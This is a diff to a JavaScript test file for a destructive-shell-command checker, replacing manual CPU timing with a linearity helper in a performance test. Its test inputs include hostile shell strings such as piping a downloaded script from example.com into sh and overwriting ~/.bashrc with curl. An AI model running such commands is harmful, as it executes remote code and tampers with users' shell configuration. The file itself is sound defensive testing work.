@@ -8,9 +8,9 @@ process.env.ZN_STATS = 'off';
 
 const test = require('node:test');
 const assert = require('node:assert/strict');
+const { assertLinear } = require('./helpers/time_ratio');
 
 const { checkCommand } = require('../lib/destructive');
-const { cpuNow, cpuMsSince } = require('./helpers/time_budget');
 
 const DL = 'https://example.com/i.sh';
 const RC = 'https://example.com/env.sh';
@@ -69,14 +69,7 @@ test('a cd inside a pipeline does not move the folder of the next command', () =
 
 test('200 KB inputs with redirects and targets stay linear', () => {
   for (const u of ['>> ~/.bashrc cat x; ', `curl -o$HOME/x ${RC} | dd of=$HOME/y; `, `cd ~ && curl -o .bashrc ${RC}; `, '>a >b >c >d echo hi; ']) {
-    const big = u.repeat(Math.floor((200 * 1024 - 8) / u.length));
-    const t0 = cpuNow();
-    rule(big);
-    const ms = cpuMsSince(t0);
-    assert.ok(ms < 3000, JSON.stringify(u) + ' took ' + ms + ' ms');
+    assertLinear(rule, (n) => u.repeat(Math.floor(n / u.length)), 200 * 1024 - 8, JSON.stringify(u));
   }
-  const redirects = '>x '.repeat(60000) + `curl ${RC} | sh`;
-  const t1 = cpuNow();
-  rule(redirects);
-  assert.ok(cpuMsSince(t1) < 3000);
+  assertLinear(rule, (n) => '>x '.repeat(n) + `curl ${RC} | sh`, 60000, 'many redirects');
 });
